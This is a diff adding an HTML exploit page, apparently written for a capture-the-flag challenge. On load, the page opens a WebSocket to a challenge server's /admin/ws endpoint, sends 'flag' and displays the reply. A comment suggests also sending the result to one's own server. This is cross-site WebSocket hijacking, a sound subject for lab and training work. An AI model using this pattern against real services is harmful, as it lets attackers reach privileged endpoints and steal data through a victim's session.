@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fetch Flag</title>
+</head>
+<body>
+    <h1>Fetching the Flag...</h1>
+    <div id="flag"></div>
+
+    <script>
+        // Ensure WebSocket connection to the server's /admin/ws endpoint
+        const ws = new WebSocket('ws://ce441-web.spchallenge.ir:8080/admin/ws');
+
+        // Once the WebSocket is open, send the 'flag' command to fetch the flag
+        ws.onopen = function() {
+            console.log('WebSocket connection established!');
+            ws.send('flag');
+        };
+
+        // Handle the response from the WebSocket (i.e., the flag)
+        ws.onmessage = function(event) {
+            const message = event.data;
+            console.log('Flag received:', message);
+
+            // Display the flag on the page (you could also send it back to your server)
+            document.getElementById('flag').textContent = 'Flag: ' + message;
+        };
+
+        // Handle any errors that may occur with the WebSocket
+        ws.onerror = function(error) {
+            console.error('WebSocket error:', error);
+        };
+
+        // Close the WebSocket connection once done
+        ws.onclose = function() {
+            console.log('WebSocket connection closed');
+        };
+    </script>
+</body>
+</html>
+
